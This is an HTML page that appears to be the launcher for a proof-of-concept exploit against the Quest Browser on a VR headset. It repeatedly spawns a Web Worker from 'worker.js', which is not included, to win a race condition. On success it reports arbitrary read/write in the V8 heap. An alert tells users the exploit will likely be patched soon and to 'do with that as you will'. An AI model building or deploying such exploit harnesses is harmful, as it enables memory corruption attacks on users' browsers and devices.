<!doctype html>
<html>
<head><title>Journey</title></head>
<body style="background:#000;color:#FFF;font-family:monospace;font-size:12px;padding:0px;">
<div id="out"></div>
<div style="position: fixed; left: 50%; top: 50%; transform: translate(-50%, -50%); display: flex; flex-direction: column; align-items: center; gap: 10px;">

    <button id="exploitButton">

</div>
<script>
const out = document.getElementById('out');
const log = s => { out.innerHTML += s + '<br>'; console.log(s); };
log('journey web vuln (oct 3rd 2026)');
const button = document.getElementById('exploitButton');
const hoverSound = new Audio('sfx_hover.ogg');
const pressSound = new Audio('sfx_release_main.ogg');
hoverSound.preload = 'auto';
pressSound.preload = 'auto';
let audioUnlocked = false;
let fuckingAround = false;
let fails = 0;
document.addEventListener('pointerdown', () => {
    if (audioUnlocked)
    {
        return;
    }
    hoverSound.volume = 0;
    hoverSound.play().then(() => { hoverSound.pause(); hoverSound.currentTime = 0; hoverSound.volume = 1; audioUnlocked = true; }).catch(() => {});
}, { once: true });
button.addEventListener('mouseenter', () => {
    if (!audioUnlocked)
    {
        return;
    }
    hoverSound.currentTime = 0;
    hoverSound.play();
});
button.addEventListener('mousedown', () => {
    pressSound.currentTime = 0;
    pressSound.play();
});
button.addEventListener('click', () => {
    if (fuckingAround)
    {
        return;
    }
    fuckingAround = true;
    alert('Press OK to start the exploit.\n\nYour headset may encounter issues during this.\nIf so, please reboot your headset and try again.\n\nIn no way is this root, this is demo PoC for exploits\nwithin the Quest Browser and is still limited in terms of power.\n\nTHIS WILL LIKELY BE PATCHED SOON\nDO WITH THAT AS YOU WILL');
    //Launch the race exploit
    const start = performance.now();
    let tries = 0;
    let worker;
    
    log('starting exploit...');
    try {
        const testWorker = new Worker('worker.js');
        log('worker created ok');
    } catch(e) {
        log('worker error: ' + e);
        return;
    }

    function run() {
        if (fails >= 100)
        {
            log(`error - exploit likely patched`);
            return;
        }
        tries++;
        if (worker) worker.terminate();
        worker = new Worker('worker.js');
        worker.onmessage = ({data}) => {
            if (data === 'READY') worker.postMessage('arm');
            else if (data === 'ARMED') worker.postMessage('check');
            else if (data === 'MISS') {
                log('miss — retrying...');
                fails++
                run();
            }
            else if (data.startsWith('PASS')) {
                worker.terminate();
                const elapsed = ((performance.now() - start) / 1000).toFixed(2);
                fails = 0;
                log(`pass - arb r/w in v8 heap`);
                log(`result: ${data}`);
                log(`try: ${tries} | time: ${elapsed}s`);
            }
        };
        worker.onerror = ({message}) => {
            log(`err: ${message}`);
        };
    }
    
    run();
});
</script>
